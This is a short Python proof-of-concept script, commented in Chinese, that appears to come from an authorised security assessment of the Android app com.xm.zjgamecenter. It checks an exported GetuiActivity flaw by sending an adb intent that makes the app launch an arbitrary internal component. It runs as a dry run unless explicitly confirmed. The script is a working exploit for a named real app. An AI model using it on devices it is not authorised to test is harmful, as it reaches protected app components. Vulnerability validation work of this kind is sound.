#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-013 GetuiActivity trampoline —— 授权测试设备 adb 验证（需 POC_CONFIRM=YES）。

证据背景：
  - decompiled/jadx/sources/com/bianfeng/privategetui/GetuiActivity.java:17-37：
    exported=true（AndroidManifest.xml:572），读 extra `pkgName`（PushClientConstants.TAG_PKG_NAME）
    -> setClassName -> startActivity；另有 key/params extra 写入 SharedPreferences。
  - 任意应用（或 adb）可借该 exported Activity 以应用自身身份启动任意内部组件。

边界：
  - 仅限授权的本地测试设备；默认 dry-run 只打印命令，POC_CONFIRM=YES 才真正执行。
  - 不发送任何网络请求。
"""
import argparse
import os
import shutil
import subprocess
import sys

PKG = "com.xm.zjgamecenter"
ACT = "com.bianfeng.privategetui.GetuiActivity"


def main() -> int:
    ap = argparse.ArgumentParser(
        description="VULN-013 通过 exported GetuiActivity 跳板启动应用内任意组件（授权测试设备，dry-run 默认）"
    )
    ap.add_argument("--serial", required=True, help="adb 设备序列号（授权测试设备）")
    ap.add_argument("--target-component", required=True,
                    help="目标组件全类名（应用内），如 com.xm.zjgamecenter.xxx.SomeActivity")
    ap.add_argument("--h5url", help="可选：透传 h5url extra（验证目标组件是否二次校验，见 README）")
    args = ap.parse_args()

    adb = shutil.which("adb")
    if not adb:
        print("[-] 未找到 adb，请先安装 Android platform-tools 并加入 PATH", file=sys.stderr)
        return 2

    cmd = [adb, "-s", args.serial, "shell", "am", "start",
           "-n", f"{PKG}/{ACT}",
           "--es", "pkgName", args.target_component]
    if args.h5url:
        cmd += ["--es", "h5url", args.h5url]

    printable = " ".join(cmd)
    print("[=] 待执行命令:\n    " + printable)

    if os.environ.get("POC_CONFIRM") != "YES":
        print("\n[dry-run] 未设置 POC_CONFIRM=YES，仅打印命令不执行。"
              "确认目标为授权测试设备后：POC_CONFIRM=YES python3 validate_request.py ...")
        return 0

    print("[+] POC_CONFIRM=YES，执行（仅限授权测试设备）...")
    p = subprocess.run(cmd, capture_output=True, text=True)
    print(p.stdout, end="")
    if p.returncode != 0:
        print(p.stderr, file=sys.stderr)
        print(f"[-] adb 返回码 {p.returncode}", file=sys.stderr)
        return p.returncode
    print("[+] 已发出 intent。请在设备上观察是否弹出目标组件，并检查 logcat 佐证。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
